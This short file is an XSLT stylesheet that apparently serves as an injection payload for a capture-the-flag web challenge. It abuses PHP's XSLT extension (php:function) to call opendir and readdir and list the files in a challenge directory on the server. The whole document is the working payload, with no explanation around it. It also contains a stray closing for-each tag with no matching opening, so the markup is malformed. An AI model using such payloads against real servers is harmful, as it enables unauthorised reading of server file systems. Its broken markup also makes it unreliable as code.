<xsl:stylesheet version="1.0"
  xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
  xmlns:php="http://php.net/xsl"
  extension-element-prefixes="php">
  
  <xsl:template match="/">
<xsl:value-of select="php:function('opendir','/challenge/web-serveur/ch50/')"/>
<xsl:value-of select="php:function('readdir')"/> -
<xsl:value-of select="php:function('readdir')"/> -
<xsl:value-of select="php:function('readdir')"/> -
      <xsl:value-of select="."/><br/>
    </xsl:for-each>
  </xsl:template>
</xsl:stylesheet>
